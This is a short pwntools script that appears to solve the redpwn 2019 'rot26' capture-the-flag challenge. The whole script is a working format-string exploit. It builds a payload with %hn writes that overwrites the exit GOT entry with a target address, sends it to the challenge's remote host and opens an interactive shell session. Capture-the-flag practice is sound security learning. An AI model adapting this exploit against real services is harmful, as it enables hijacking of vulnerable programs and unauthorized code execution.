from pwn import *

#r = process('./rot26')
r = remote('chall.2019.redpwn.net', 4003)

target = 0x8048737
exit_got = 0x804a020

payload = p32(exit_got)
payload += "%{}c%{}$hn".format(target&0xffff, 7).ljust(16, 'a')

print payload 
r.sendline(payload)
r.interactive()